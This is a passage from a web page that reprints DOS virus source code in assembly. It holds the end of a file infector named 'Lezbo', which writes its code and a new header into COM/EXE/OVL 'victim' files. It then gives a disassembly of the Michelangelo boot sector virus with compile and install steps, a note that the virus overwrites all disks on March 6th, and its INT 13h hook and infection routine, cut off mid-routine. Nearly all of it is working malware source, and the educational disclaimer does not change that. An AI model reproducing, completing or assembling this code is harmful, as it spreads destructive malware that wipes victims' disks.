&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span>offset Buffer_End<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>offset Virus_End<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cld</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">repz</span>&nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset Buffer_End<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;write virus code to victim</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Int_21h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jc</span>&nbsp; &nbsp; &nbsp; short inf_close<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4200h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;set ptr loc</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Int_21h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span>&nbsp; &nbsp; &nbsp; short inf_close<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset data_buf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>offset Buffer_End<span style="color: #339933;">-</span>offset data_buf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;write new header to victim</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Int_21h<br />
<br />
inf_close<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span>&nbsp; &nbsp; &nbsp; short close_file<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1Fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;set timestamp to 62 secs</span><br />
<br />
close_file<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5701h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;set file date and time</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Int_21h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3eh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Int_21h<br />
<br />
cant_infect<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popf</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
Int_21h<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushf</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>int21_vec&nbsp; <span style="color: black; font-style: italic;">;call real INT 21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
virname &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">' -[LEZBO]- The Whore of Babylon '</span><br />
ext_table &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'COMEXEOVL'</span><br />
<br />
first_4 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0FFF0h</span><br />
origstack &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0FFFFh</span><br />
<br />
Virus_End<span style="color: #339933;">:</span><br />
data_buf<span style="color: #339933;">:</span><br />
Disk_ID &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ?<br />
Last_Page &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ?<br />
File_Size &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ?<br />
Relocs&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;;</span><br />
Header_Size &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ?<br />
Min_Alloc &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;;</span><br />
Max_Alloc &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;;</span><br />
Stack_SS&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;;</span><br />
Stack_SP&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ?<br />
CheckSum&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ?<br />
Start_IP&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ?<br />
Start_CS&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;;</span><br />
Reloc_Ofs &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;;</span><br />
Overlays&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; ?<br />
<br />
Buffer_End<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End &nbsp; &nbsp; Lezbo<br />
&nbsp;</div>
<h3><a name="pj3"></a>Michelangelo</h3>
<p>The infamous Michelangelo virus is a boot sector/MBR infecting virus. As viruses go, it is very basic. Except for about 40 bytes, this virus is a byte-for-byte imitation of the <strong>Stoned</strong> virus. Installation procedures are included in the source code.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">COMMENT~===============================================================<br />
=<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Michelangelo Boot Sector Virus<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">------------------------------</span><br />
= &nbsp; &nbsp; &nbsp; &nbsp; Disassembly <span style="color: black;">&#40;</span>c<span style="color: black;">&#41;</span><span style="color: #ff0000;">1993</span> Karsten Johansson<span style="color: #339933;">,</span> PC Scavenger<br />
=<br />
=<br />
=======================================================================<br />
<br />
= &nbsp;CAUTION<span style="color: #339933;">:</span> &nbsp;This virus contains damaging <span style="color: #0000ff; font-weight: bold;">code</span>!! <span style="color: #0000ff; font-weight: bold;">Do</span> <span style="color: #00007f; font-weight: bold;">NOT</span> experiment with<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;it unless you have PC Scavenger installed properly on your<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;system<span style="color: #339933;">,</span> <span style="color: #00007f; font-weight: bold;">or</span> have a clean boot disk with FDISK handy<span style="color: #339933;">.</span><br />
=<br />
= &nbsp;NOTES<span style="color: #339933;">:</span> &nbsp; &nbsp;The Michelangelo is a Stoned varient virus<span style="color: #339933;">.</span> Instead of<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;printing a harmless message to your screen on every <span style="color: #ff0000;">7</span><br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;boots<span style="color: #339933;">,</span> the Michelangelo waits until March 6th<span style="color: #339933;">,</span> on which day<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;it will proceed to overwrite the sectors on all disks <span style="color: #00007f; font-weight: bold;">in</span><br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;the computer<span style="color: #339933;">.</span> The disks are unrecoverable<span style="color: #339933;">,</span> <span style="color: #00007f; font-weight: bold;">and</span> need to be<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;reformatted if this happens<span style="color: #339933;">.</span><br />
=<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">DO</span> <span style="color: #00007f; font-weight: bold;">NOT</span> INFECT ANYONE<span style="color: #7f007f;">'S SYSTEM BUT YOUR OWN! To do so is a<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;federal offence.<br />
=<br />
=<br />
= &nbsp;COMPILE: &nbsp;With TASM: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TASM MICH<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TLINK MICH<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EXE2BIN MICH<br />
=<br />
= &nbsp;INSTALL: &nbsp;Use a disk editor such as DISKEDIT from Norton Utilities.<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;With a formatted floppy diskette (with system files), copy<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;the boot sector to Side 1, Sector 3, then copy the virus<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;code to the original boot sector. To install the virus in<br />
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;memory, reboot the system with the newly infected diskette.<br />
=<br />
=======================================================================<br />
= &nbsp;BEFORE COMPILING THIS CODE, IT MUST BE NOTED THAT THE AUTHOR AND<br />
= &nbsp;PUBLISHER OF THIS BOOK CANNOT BE HELD LIABLE FOR ANY DAMAGES THAT MAY<br />
= &nbsp;BE INCURRED BY THE USE OF OR THE EXPERIMENTATION WITH COMPUTER<br />
= &nbsp;VIRUSES. THIS BOOK IS FOR EDUCATIONAL PURPOSES ONLY. EDUCATION IS NOT<br />
= &nbsp;HERE TO BE ABUSED.<br />
=<br />
=======================================================================<br />
~<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .radix&nbsp; 16<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .model&nbsp; tiny<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .code<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; 0<br />
<br />
Mich_Boot:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jmp &nbsp; &nbsp; Second_Entry&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Jump to virus entry point<br />
<br />
;=== Data used by virus ===================================<br />
<br />
Hi_JMP&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; offset JMP_Here<br />
Hi_JMP_Seg&nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; 0<br />
Disk_Number &nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; 2<br />
Track_Sector&nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; 3<br />
INT13_Ofs &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; 0<br />
INT13_Seg &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; 0<br />
<br />
<br />
;=== INT 13h handler ======================================<br />
<br />
INT_13h:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ds<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; or&nbsp; &nbsp; &nbsp; dl,dl<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp; Real_INT13<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; ax,ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ds,ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; test&nbsp; &nbsp; byte ptr ds:43Fh,1&nbsp; &nbsp; &nbsp; ;Is disk motor running?<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp; Real_INT13<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ds<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pushf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; dword ptr cs:INT13_Ofs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pushf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; Infect<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; popf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retf&nbsp; &nbsp; 2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Return to caller<br />
<br />
Real_INT13:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ds<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jmp &nbsp; &nbsp; dword ptr cs:INT13_Ofs&nbsp; ;Do real INT 13h<br />
<br />
;=== Infection routines ===================================<br />
<br />
Infect:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; bx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; cx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; dx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ds<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; es<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; si<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; di<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; cs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ds<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; cs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; es<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; si,4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Try up to 4 times to read<br />
<br />
Read_Loop:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,201h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Read boot sector<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; bx,200h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; to end of virus code<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,1<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; dx,dx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pushf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; dword ptr INT13_Ofs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jnb &nbsp; &nbsp; Read_Done<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; ax,ax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Reset Disk<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pushf<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; dword ptr INT13_Ofs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dec &nbsp; &nbsp; si<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp; Read_Loop<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jmp &nbsp; &nbsp; short Quit<br />
<br />
Read_Done:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; si,si<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cld<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lodsw<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ax,word ptr [bx]&nbsp; &nbsp; &nbsp; &nbsp; ;Compare first 2 bytes<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp; Move_Real_Boot<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lodsw<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ax,word ptr [bx + 2]&nbsp; &nbsp; ;Compare next 2 bytes<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; Quit<br />
<br />
Move_Real_Boot:<br />
